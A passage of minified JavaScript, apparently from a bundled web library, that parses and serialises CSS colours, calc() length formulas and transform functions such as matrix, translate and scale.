Map([["black","#000000"],["silver","#c0c0c0"],["gray","#808080"],["white","#ffffff"],["maroon","#800000"],["red","#ff0000"],["purple","#800080"],["fuchsia","#ff00ff"],["green","#008000"],["lime","#00ff00"],["olive","#808000"],["yellow","#ffff00"],["navy","#000080"],["blue","#0000ff"],["teal","#008080"],["aqua","#00ffff"],["orange","#ffa500"],["aliceblue","#f0f8ff"],["antiquewhite","#faebd7"],["aquamarine","#7fffd4"],["azure","#f0ffff"],["beige","#f5f5dc"],["bisque","#ffe4c4"],["blanchedalmond","#ffebcd"],["blueviolet","#8a2be2"],["brown","#a52a2a"],["burlywood","#deb887"],["cadetblue","#5f9ea0"],["chartreuse","#7fff00"],["chocolate","#d2691e"],["coral","#ff7f50"],["cornflowerblue","#6495ed"],["cornsilk","#fff8dc"],["crimson","#dc143c"],["cyan","#00ffff"],["darkblue","#00008b"],["darkcyan","#008b8b"],["darkgoldenrod","#b8860b"],["darkgray","#a9a9a9"],["darkgreen","#006400"],["darkgrey","#a9a9a9"],["darkkhaki","#bdb76b"],["darkmagenta","#8b008b"],["darkolivegreen","#556b2f"],["darkorange","#ff8c00"],["darkorchid","#9932cc"],["darkred","#8b0000"],["darksalmon","#e9967a"],["darkseagreen","#8fbc8f"],["darkslateblue","#483d8b"],["darkslategray","#2f4f4f"],["darkslategrey","#2f4f4f"],["darkturquoise","#00ced1"],["darkviolet","#9400d3"],["deeppink","#ff1493"],["deepskyblue","#00bfff"],["dimgray","#696969"],["dimgrey","#696969"],["dodgerblue","#1e90ff"],["firebrick","#b22222"],["floralwhite","#fffaf0"],["forestgreen","#228b22"],["gainsboro","#dcdcdc"],["ghostwhite","#f8f8ff"],["gold","#ffd700"],["goldenrod","#daa520"],["greenyellow","#adff2f"],["grey","#808080"],["honeydew","#f0fff0"],["hotpink","#ff69b4"],["indianred","#cd5c5c"],["indigo","#4b0082"],["ivory","#fffff0"],["khaki","#f0e68c"],["lavender","#e6e6fa"],["lavenderblush","#fff0f5"],["lawngreen","#7cfc00"],["lemonchiffon","#fffacd"],["lightblue","#add8e6"],["lightcoral","#f08080"],["lightcyan","#e0ffff"],["lightgoldenrodyellow","#fafad2"],["lightgray","#d3d3d3"],["lightgreen","#90ee90"],["lightgrey","#d3d3d3"],["lightpink","#ffb6c1"],["lightsalmon","#ffa07a"],["lightseagreen","#20b2aa"],["lightskyblue","#87cefa"],["lightslategray","#778899"],["lightslategrey","#778899"],["lightsteelblue","#b0c4de"],["lightyellow","#ffffe0"],["limegreen","#32cd32"],["linen","#faf0e6"],["magenta","#ff00ff"],["mediumaquamarine","#66cdaa"],["mediumblue","#0000cd"],["mediumorchid","#ba55d3"],["mediumpurple","#9370db"],["mediumseagreen","#3cb371"],["mediumslateblue","#7b68ee"],["mediumspringgreen","#00fa9a"],["mediumturquoise","#48d1cc"],["mediumvioletred","#c71585"],["midnightblue","#191970"],["mintcream","#f5fffa"],["mistyrose","#ffe4e1"],["moccasin","#ffe4b5"],["navajowhite","#ffdead"],["oldlace","#fdf5e6"],["olivedrab","#6b8e23"],["orangered","#ff4500"],["orchid","#da70d6"],["palegoldenrod","#eee8aa"],["palegreen","#98fb98"],["paleturquoise","#afeeee"],["palevioletred","#db7093"],["papayawhip","#ffefd5"],["peachpuff","#ffdab9"],["peru","#cd853f"],["pink","#ffc0cb"],["plum","#dda0dd"],["powderblue","#b0e0e6"],["rosybrown","#bc8f8f"],["royalblue","#4169e1"],["saddlebrown","#8b4513"],["salmon","#fa8072"],["sandybrown","#f4a460"],["seagreen","#2e8b57"],["seashell","#fff5ee"],["sienna","#a0522d"],["skyblue","#87ceeb"],["slateblue","#6a5acd"],["slategray","#708090"],["slategrey","#708090"],["snow","#fffafa"],["springgreen","#00ff7f"],["steelblue","#4682b4"],["tan","#d2b48c"],["thistle","#d8bfd8"],["tomato","#ff6347"],["turquoise","#40e0d0"],["violet","#ee82ee"],["wheat","#f5deb3"],["whitesmoke","#f5f5f5"],["yellowgreen","#9acd32"],["rebeccapurple","#663399"]]),ep=function(){function t(){}return t.get=function(t){return DD.get(t)},t}();function nn(t,e){for(var i=[];t.length;)i.push(t.slice(0,e)),t=t.slice(e);return i}function xE(t,e){return nn(t.split(""),e).map((function(t){return t.join("")}))}function IE(t){return parseInt(t,16)}function Ua(t,e){var i=void 0,r=Number.NEGATIVE_INFINITY;return t.forEach((function(t){var n=e(t);r<n&&(i=t,r=n)})),i}function Zc(t,e){return Ua(Array.from(t),e)}var kD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),FD=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},PE=function(t){function e(e,i,r){void 0===e&&(e=0),void 0===i&&(i=0),void 0===r&&(r=0);var n=t.call(this,e,i,r)||this;return n.red_=e,n.green_=i,n.blue_=r,n}return kD(e,t),e.prototype.getRed=function(){return this.red_},e.prototype.getGreen=function(){return this.green_},e.prototype.getBlue=function(){return this.blue_},e.prototype.toNumbers=function(){return[this.red_,this.green_,this.blue_]},e.fromNumbers=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return new(this.bind.apply(this,FD([void 0],t)))},e}(Wn),Ha=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},ND="0123456789abcdefABCDEF",bo=function(){function t(t,e,i,r){void 0===t&&(t=0),void 0===e&&(e=0),void 0===i&&(i=0),void 0===r&&(r=1),this.rgb_=new PE(t,e,i),this.alpha_=r}return t.fromImageData=function(e){for(var i=e.data,r=[],n=0;n<i.length;n+=4){var s=i[n],o=i[n+1],a=i[n+2],l=i[n+3];r.push(new t(s,o,a,l))}return r},t.toImageData=function(t,e){var i=t.map((function(t){return t.toNumbers()}));return new ImageData(new Uint8ClampedArray(qt(i)),e.width,e.height)},t.fromStyleString=function(e){return t.isHexValue_(e)?this.fromHex(e):"rgb"===e.slice(0,3)?this.fromRgb(e):ep.get(e)?this.fromHex(ep.get(e)):void console.error('Invalid string "'+e+'" provided to Color.fromStyleString')},t.fromString=function(t){return console.warn("Deprecating in favor of fromStyleString to add wider support for ICssStyleValueInstance"),this.fromStyleString(t)},t.fromHex=function(e){var i=e.split("#").slice(-1)[0];3!==i.length&&6!==i.length&&console.error("Invalid hexValue provided to Color");var r=xE(i,i.length/3).map((function(t){return 2===t.length?t:""+t+t})).map((function(t){return IE(t)}));return new(t.bind.apply(t,Ha([void 0],r)))},t.fromHexes=function(){for(var t=this,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return e.map((function(e){return t.fromHex(e)}))},t.fromRgb=function(e){var i=e.split("(").slice(-1)[0].split(")")[0].split(",").map((function(t){return En(t)})),r=i.slice(0,3).map((function(t){return parseInt(t)})),n=i[3],s=void 0===n?1:parseFloat(n);return new(t.bind.apply(t,Ha([void 0],r,[s])))},t.fromElementBackgroundColor=function(t){return this.fromString(vt(t,"background-color"))},t.isHexValue_=function(t){return"#"===t[0]&&(t=t.slice(1)),t.split("").every((function(t){return-1!==ND.indexOf(t)}))},t.prototype.getRGB=function(){return this.rgb_},t.prototype.getAlpha=function(){return this.alpha_},t.prototype.getColorWithHighestContrast=function(){for(var t=this,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return Zc(e,(function(e){return e.getRGB().subtract(t.getRGB()).getLength()}))},t.prototype.toStyleString=function(){return"rgba("+Ha(this.getRGB().getValues().map((function(t){return Math.round(t)})),[this.alpha_]).join(", ")+")"},t.prototype.getBrightness=function(){return 3*this.getRed()+4*this.getGreen()+this.getBlue()>>>3},t.prototype.getRed=function(){return this.rgb_.getRed()},t.prototype.getGreen=function(){return this.rgb_.getGreen()},t.prototype.getBlue=function(){return this.rgb_.getBlue()},t.prototype.toNumbers=function(){return Ha(this.rgb_.toNumbers(),[this.alpha_])},t.fromNumbers=function(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return new(t.bind.apply(t,Ha([void 0],e)))},t}(),VD=/^\-?((([0-9]*\.?[0-9]+)([a-zA-Z\%]*))|([a-zA-Z\%]+))$/,Bt=function(){function t(t,e){this.numericValue=t,this.symbol=e}return t.prototype.isNumber=function(){return null===this.symbol},t.prototype.isVariable=function(){return!this.isNumber()},t.fromString=function(e){var i=VD.exec(e);return null===i?(ct.throw('Invalid variable value in "'+e+'"'),new t(0,"")):new t(("-"===e[0]?-1:1)*(i[3]?parseFloat(i[3]):1),i[4]||i[5]||null)},t.prototype.toString=function(){var t=null===this.symbol?"":this.symbol;return""+this.numericValue+t},t.prototype.invert=function(){return new t(-this.numericValue,this.symbol)},t}(),Jc=function(){function t(){}return t.execute=function(e,i){return e.symbol===i.symbol||null===e.symbol||null===i.symbol?[new Bt(e.numericValue/i.numericValue,e.symbol||i.symbol)]:[e,t,i]},t}(),eu=function(){function t(){}return t.execute=function(e,i){return e.symbol===i.symbol||null===e.symbol||null===i.symbol?[new Bt(e.numericValue*i.numericValue,e.symbol||i.symbol)]:[e,t,i]},t}(),Cs=function(){function t(){}return t.execute=function(e,i){return e.symbol===i.symbol?[new Bt(e.numericValue+i.numericValue,e.symbol)]:[e,t,i]},t}(),sn=function(){function t(){}return t.execute=function(e,i){return e.symbol===i.symbol?[new Bt(e.numericValue-i.numericValue,e.symbol)]:[e,t,i]},t}(),tu=new Map([["*",eu],["/",Jc],["+",Cs],["-",sn]]),tp=Lc(tu),OE=[[Jc,eu],[Cs,sn]];function RE(t,e){for(var i=0;i<t.length;i++)e.has(t[i])&&(t[i]=e.get(t[i]));return t}function wo(t,e){return-1!==t.indexOf(e)}var qD=new RegExp(/^[A-Za-z0-9\.\-\s\+\*\/\%]*$/),ru=function(){function t(e){this.pieces_=t.reduce_(e)}return t.fromString=function(e){qD.test(e)||ct.throw('Invalid formula "'+e+'", does not match regex');for(var i=RE(e.replace(/ /g,"").split(""),tu),r=[],n=0,s=0;s<i.length;){var o="";if("string"==typeof i[s]){for(;"string"==typeof i[s];)o+=i[s],s++;r[n]=Bt.fromString(o)}else r[n]=i[s],s++;n++}return new t(r)},t.prototype.getPieces=function(){return this.pieces_},t.prototype.toString=function(){return this.getPieces().map((function(t){return tp.has(t)?tp.get(t):t instanceof Bt?t.toString():void 0})).join(" ")},t.reduce_=function(e){return t.reduceWithExecution_(t.reduceWithNegation_(t.reduceFirstNegation_(e)))},t.reduceFirstNegation_=function(t){if(t.length>1&&t[0]===sn){var e=t[1];if(!(e instanceof Bt))return ct.throw("Formulas should start with a Variable"),[];var i=t.slice(1);return i[0]=e.invert(),i}return t},t.reduceWithNegation_=function(t){var e=t.length;if(0===e)return t;var i=t[0];if(i instanceof Bt||ct.throw("Formulas should start with a Variable"),1===e)return t;for(var r=[i],n=1,s=function(t){r[n]=t,n++},o=1;o<e;o++){var a=r[n-1],l=r[n-2],h=t[o];h instanceof Bt?a instanceof Bt?ct.throw("Formula does not support implicit multiplication."):a!==sn||l instanceof Bt?l instanceof Bt?s(h):ct.throw("Formulas must have a value between operators."):r[n-1]=h.invert():a instanceof Bt?s(h):h!==sn?ct.throw("Formulas must have a value between operators."):l instanceof Bt||!mi(l)?s(h):ct.throw("Formulas must have a value between operators.")}return r},t.reduceWithOperations_=function(t,e){var i=e.filter((function(e){return wo(t,e)}));if(0===i.length)return t;var r=new Set(i);if(1===t.length)return t;t.length%2==0&&ct.throw("Cannot reduce with operation on an even number of pieces");for(var n=[t[0],t[1]],s=2,o=2;o<t.length;o+=2){var a=n[s-2],l=n[s-1],h=t[o];if(!(a instanceof Bt))return ct.throw("Found IOperation where a Variable was expected"),[];if(!(h instanceof Bt))return ct.throw("Found IOperation where a Variable was expected"),[];if(l instanceof Bt)return ct.throw("Found Variable where a IOperation was expected"),[];if(r.has(l)){var c=l.execute(a,h);1===c.length?(n.pop(),n.pop(),n[s-2]=c[0],s--):(n[s-2]=c[0],n[s-1]=c[1],n[s]=c[2],s++)}else n[s]=h,s++;o+1<t.length&&(n[s]=t[o+1],s++)}return n},t.reduceWithExecution_=function(e){return 1===e.length?e:(e.length%2==0&&ct.throw("Cannot reduce with execution on an even number of pieces"),OE.reduce((function(e,i){return t.reduceWithOperations_(e,i)}),e))},t.prototype.reduce=function(){return console.warn("Formula.reduce is deprecated. All formulas are now reduced at construction."),this},t}(),rp=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},Yr=["px","%","vh","vw","vmin","vmax","em","rem"],ut=function(){function t(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.values_=t}return t.fromVariables=function(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var r=new Xe(t.mapValuesBySymbol_.apply(t,e),Map,(function(){return 0}));return new(t.bind.apply(t,rp([void 0],Yr.map((function(t){return r.get(t)})))))},t.mapValuesBySymbol_=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t.map((function(t){return[t.symbol,t.numericValue]}))},t.fromNumbers=function(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return new(t.bind.apply(t,rp([void 0],e)))},t.fromStyleString=function(e){for(var i="calc"===e.slice(0,4)?e.slice(5,-1):e,r=ru.fromString(i).getPieces(),n=[],s=r.length-1;s>=0;s--){var o=r[s];o===sn?(n[s]=Cs,n[s+1]=n[s+1].invert()):o instanceof Bt||o===Cs?n[s]=o:ct.throw("CssCalcFormula currently only supports Add/Subtract")}var a=n.filter((function(t){return wo(Yr,t.symbol)})).filter((function(t){return t instanceof Bt})),l=Yr.map((function(t){return a.find((function(e){return e.symbol===t}))||new Bt(0,t)})).map((function(t){return t.numericValue}));return new(t.bind.apply(t,rp([void 0],l)))},t.prototype.toNumbers=function(){return this.values_.slice()},t.prototype.toStyleString=function(){var t=Vt(this.values_,Yr).filter((function(t){var e=t[0];t[1];return 0!==e})).map((function(t){return t.join("")}));return 0===t.length?"0px":1===t.length?t[0]:"calc("+t.join(" + ")+")"},t}(),iu=function(){function t(t){this.value_=t}return t.fromNumbers=function(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return new t(e[0])},t.fromStyleString=function(e){return new t(parseFloat(e))},t.prototype.toNumbers=function(){return[this.value_]},t.prototype.toStyleString=function(){return""+this.value_},t}(),nu=new Map([["background-color",bo],["background-position-x",ut],["background-position-y",ut],["border-color",bo],["border-radius",ut],["bottom",ut],["color",bo],["fill",bo],["max-height",ut],["height",ut],["left",ut],["margin-bottom",ut],["margin-left",ut],["margin-right",ut],["margin-top",ut],["opacity",iu],["padding-bottom",ut],["padding-left",ut],["padding-right",ut],["padding-top",ut],["right",ut],["stroke",bo],["top",ut],["max-width",ut],["width",ut]]);function ip(t,e){return nu.get(t).fromStyleString(e)}function on(t){if(-1===t.indexOf("(")&&-1===t.indexOf(")"))return"";if(-1===t.indexOf("(")&&-1!==t.indexOf(")"))return ct.throw("Value passed to getContentInFirstSetOfParentheses() has no opening parenthesis"),"";for(var e=t.indexOf("(")+1,i=1,r=e;i>0&&r<t.length;){var n=t[r];")"===n?i--:"("===n&&i++,r++}if(i>0)return ct.throw("Value passed to getContentInFirstSetOfParentheses() has uneven opening/closing parentheses"),"";var s=r-1;return t.slice(e,s)}var et=function(){function t(t,e){this.keyword_=t,this.values_=e}return t.styleStringToPlainNumbers=function(e){return t.styleStringToValues(e).map((function(t){return parseFloat(t)}))},t.styleStringToValues=function(t){return on(t).split(",").map((function(t){return En(t)}))},t.prototype.toNumbers=function(){return this.values_.slice()},t.prototype.toStyleString=function(){return this.keyword_+"("+this.values_.join(",")+")"},t}(),BD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),ME=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},$E=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"matrix",e)||this}return BD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,ME([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,ME([void 0],et.styleStringToPlainNumbers(t))))},e.getDefaultValue=function(){return new e(1,0,0,1,0,0)},e.valuesLength=6,e}(et),WD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),LE=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},DE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"matrix3d",e)||this}return WD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,LE([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,LE([void 0],et.styleStringToPlainNumbers(t))))},e.getDefaultValue=function(){return new e(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1)},e.valuesLength=16,e}(et),UD=function(){return null};function Dt(t,e){void 0===e&&(e=UD);for(var i=new Array(t),r=0;r<t;r++)i[r]=e(r);return i}var HD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),su=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},ou=Yr.length,kE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var r=e.length===ou?su(e,Dt(ou,(function(){return 0}))):e;return t.call(this,"translate",r)||this}return HD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,su([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,su([void 0],qt(et.styleStringToValues(t).map((function(t){return ut.fromStyleString(t)})).map((function(t){return t.toNumbers()}))))))},e.prototype.toStyleString=function(){var t=nn(this.values_,ou).map((function(t){return ut.fromNumbers.apply(ut,t)})).map((function(t){return t.toStyleString()}));return this.keyword_+"("+t.join(",")+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,su([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=2*ou,e}(et),GD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),np=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},FE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"translateX",e)||this}return GD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,np([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,np([void 0],ut.fromStyleString(on(t)).toNumbers())))},e.prototype.toStyleString=function(){var t=ut.fromNumbers.apply(ut,this.values_).toStyleString();return this.keyword_+"("+t+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,np([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=Yr.length,e}(et),zD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),sp=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},NE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"translateY",e)||this}return zD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,sp([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,sp([void 0],ut.fromStyleString(on(t)).toNumbers())))},e.prototype.toStyleString=function(){var t=ut.fromNumbers.apply(ut,this.values_).toStyleString();return this.keyword_+"("+t+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,sp([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=Yr.length,e}(et),jD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),op=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},VE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"translateZ",e)||this}return jD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,op([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,op([void 0],ut.fromStyleString(on(t)).toNumbers())))},e.prototype.toStyleString=function(){var t=ut.fromNumbers.apply(ut,this.values_).toStyleString();return this.keyword_+"("+t+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,op([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=Yr.length,e}(et),YD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),ap=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},qE=Yr.length,BE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"translate3d",e)||this}return YD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,ap([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,ap([void 0],qt(et.styleStringToValues(t).map((function(t){return ut.fromStyleString(t)})).map((function(t){return t.toNumbers()}))))))},e.prototype.toStyleString=function(){var t=nn(this.values_,qE).map((function(t){return ut.fromNumbers.apply(ut,t)})).map((function(t){return t.toStyleString()}));return this.keyword_+"("+t.join(",")+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,ap([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=3*qE,e}(et),XD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),WE=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},UE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var r=1==e.length?[e[0],e[0]]:e;return t.call(this,"scale",r)||this}return XD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,WE([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,WE([void 0],et.styleStringToPlainNumbers(t))))},e.getDefaultValue=function(){return new e(1)},e.valuesLength=2,e}(et),QD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),HE=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},GE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"scaleX",e)||this}return QD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,HE([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,HE([void 0],et.styleStringToPlainNumbers(t))))},e.getDefaultValue=function(){return new e(1)},e.valuesLength=1,e}(et),KD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),zE=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},jE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"scaleY",e)||this}return KD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,zE([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,zE([void 0],et.styleStringToPlainNumbers(t))))},e.getDefaultValue=function(){return new e(1)},e.valuesLength=1,e}(et),ZD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),YE=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},XE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"scaleZ",e)||this}return ZD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,YE([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,YE([void 0],et.styleStringToPlainNumbers(t))))},e.getDefaultValue=function(){return new e(1)},e.valuesLength=1,e}(et),JD=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),QE=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},KE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"scale3d",e)||this}return JD(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,QE([void 0],t)))},e.fromStyleString=function(t){return 